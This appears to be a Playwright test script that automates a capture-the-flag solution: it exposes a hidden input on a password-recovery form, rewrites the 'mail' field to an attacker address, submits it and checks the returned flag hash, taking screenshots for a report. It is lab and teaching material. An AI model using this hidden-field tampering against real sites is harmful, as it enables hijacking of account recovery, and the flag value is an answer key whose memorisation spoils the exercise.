const { test, expect } = require('@playwright/test');

test('Hidden Input Vulnerability', async ({ page }) => {
  // Navigate to the recover page
  await page.goto('/index.php?page=recover');
  
  // Highlight the form
  const form = await page.locator('form');
  await form.evaluate(node => {
    node.style.border = '2px solid red';
    node.style.padding = '10px';
  });
  
  // Wait to highlight the vulnerability
  await page.waitForTimeout(2000);
  
  // Take screenshot before modification
  await page.screenshot({ path: 'reports/hidden-input-before.png' });
  
  // Show the hidden input by evaluating JavaScript in the page context
  await page.evaluate(() => {
    const hiddenInput = document.querySelector('input[type="hidden"]');
    // Change the type to text to make it visible
    hiddenInput.type = 'text';
    // Add some styling to make it stand out
    hiddenInput.style.display = 'block';
    hiddenInput.style.marginBottom = '10px';
    hiddenInput.style.border = '2px solid red';
    hiddenInput.style.padding = '5px';
  });
  
  // Wait to show the exposed hidden field
  await page.waitForTimeout(2000);
  
  // Take screenshot after exposing the hidden field
  await page.screenshot({ path: 'reports/hidden-input-exposed.png' });
  
  // Change the hidden input value
  await page.fill('input[name="mail"]', 'hacked@example.com');
  
  // Wait to show the modified value
  await page.waitForTimeout(2000);
  
  // Take screenshot after changing the value
  await page.screenshot({ path: 'reports/hidden-input-modified.png' });
  
  // Submit the form
  await page.click('input[type="submit"]');
  
  // Wait for the flag to appear
  await page.waitForSelector('h2:has-text("The flag is")');
  
  // Highlight the flag
  const flagElement = await page.locator('h2:has-text("The flag is")');
  await flagElement.evaluate(node => {
    node.style.backgroundColor = '#FFFF00';
    node.style.padding = '10px';
    node.style.border = '2px solid green';
  });
  
  // Take screenshot of the flag
  await page.screenshot({ path: 'reports/hidden-input-flag.png' });
  
  // Extract the flag
  const flagText = await flagElement.textContent();
  console.log('FLAG FOUND:', flagText.trim());
  
  // Verify the flag is correct
  expect(flagText).toContain('1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0');
});